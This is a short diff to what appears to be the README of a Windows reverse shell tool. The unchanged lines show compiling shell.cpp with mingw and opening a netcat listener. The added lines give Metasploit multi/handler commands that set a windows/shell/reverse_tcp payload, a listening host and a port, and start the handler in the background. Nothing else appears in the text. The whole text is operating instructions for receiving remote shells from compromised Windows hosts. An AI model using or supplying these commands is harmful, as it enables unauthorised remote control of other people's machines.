@@ -9,3 +9,12 @@ i686-w64-mingw32-g++ shell.cpp -o shell.exe -lws2_32 -lwininet -s -ffunction-sec
 ````
  nc -lvnp <port number>
  ````
+ 
+ # Metasploit Handler
+ ````
+  use exploit/multi/handler
+  set PAYLOAD windows/shell/reverse_tcp
+  set LHOST <Local IP>
+  set LPORT <Local Port>
+  exploit -j -z 
+  ````
